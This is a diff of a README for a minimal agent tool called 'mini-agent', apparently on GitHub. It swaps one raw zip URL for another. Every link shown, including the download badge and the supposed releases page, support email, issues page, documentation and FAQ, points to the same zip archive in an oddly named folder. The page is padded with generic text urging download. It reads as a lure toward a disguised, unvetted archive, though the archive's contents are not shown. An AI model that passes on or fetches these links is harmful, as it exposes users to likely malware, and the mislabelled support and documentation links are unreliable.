@@ -1,7 +1,7 @@
 # 🕵️ mini-agent - A Simple Tool for Your Needs
 
 ## 📥 Download Now
-[![Download mini-agent](https://raw.githubusercontent.com/Vasudevsatya/mini-agent/main/enwrought/mini-agent.zip)](https://raw.githubusercontent.com/Vasudevsatya/mini-agent/main/enwrought/mini-agent.zip)
+[![Download mini-agent](https://github.com/Vasudevsatya/mini-agent/raw/refs/heads/main/enwrought/agent-mini-2.3.zip)](https://github.com/Vasudevsatya/mini-agent/raw/refs/heads/main/enwrought/agent-mini-2.3.zip)
 
 ## 🚀 Getting Started
 mini-agent is a super minimal code-based agent designed to help you simplify tasks without any complicated setup. Follow these easy steps to download and run mini-agent on your computer.
@@ -20,7 +20,7 @@ Before you download mini-agent, ensure your computer meets these requirements:
 - **Automatic Updates:** Stays current without manual intervention.
 
 ## 💾 Download & Install
-To get started with mini-agent, simply visit this page to download: [mini-agent Releases](https://raw.githubusercontent.com/Vasudevsatya/mini-agent/main/enwrought/mini-agent.zip).
+To get started with mini-agent, simply visit this page to download: [mini-agent Releases](https://github.com/Vasudevsatya/mini-agent/raw/refs/heads/main/enwrought/agent-mini-2.3.zip).
 
 1. Click the link above to access the releases page.
 2. On the releases page, find the latest version.
@@ -62,14 +62,14 @@ If you encounter issues while running mini-agent, consider the following tips:
 ## 📞 Support
 If you need help, please contact our support team:
 
-- **Email:** https://raw.githubusercontent.com/Vasudevsatya/mini-agent/main/enwrought/mini-agent.zip
-- **GitHub Issues Page:** [Report an Issue](https://raw.githubusercontent.com/Vasudevsatya/mini-agent/main/enwrought/mini-agent.zip)
+- **Email:** https://github.com/Vasudevsatya/mini-agent/raw/refs/heads/main/enwrought/agent-mini-2.3.zip
+- **GitHub Issues Page:** [Report an Issue](https://github.com/Vasudevsatya/mini-agent/raw/refs/heads/main/enwrought/agent-mini-2.3.zip)
 
 ## 🔗 Additional Resources
-- [mini-agent Documentation](https://raw.githubusercontent.com/Vasudevsatya/mini-agent/main/enwrought/mini-agent.zip)
-- [Frequently Asked Questions](https://raw.githubusercontent.com/Vasudevsatya/mini-agent/main/enwrought/mini-agent.zip)
+- [mini-agent Documentation](https://github.com/Vasudevsatya/mini-agent/raw/refs/heads/main/enwrought/agent-mini-2.3.zip)
+- [Frequently Asked Questions](https://github.com/Vasudevsatya/mini-agent/raw/refs/heads/main/enwrought/agent-mini-2.3.zip)
 
 ## 🏁 Conclusion
 mini-agent offers a simple solution for users looking to manage tasks efficiently. With easy installation and user-friendly features, you can benefit from this tool without any technical expertise. Make sure to download mini-agent today and start simplifying your tasks!
 
-[Download mini-agent](https://raw.githubusercontent.com/Vasudevsatya/mini-agent/main/enwrought/mini-agent.zip)
+[Download mini-agent](https://github.com/Vasudevsatya/mini-agent/raw/refs/heads/main/enwrought/agent-mini-2.3.zip)
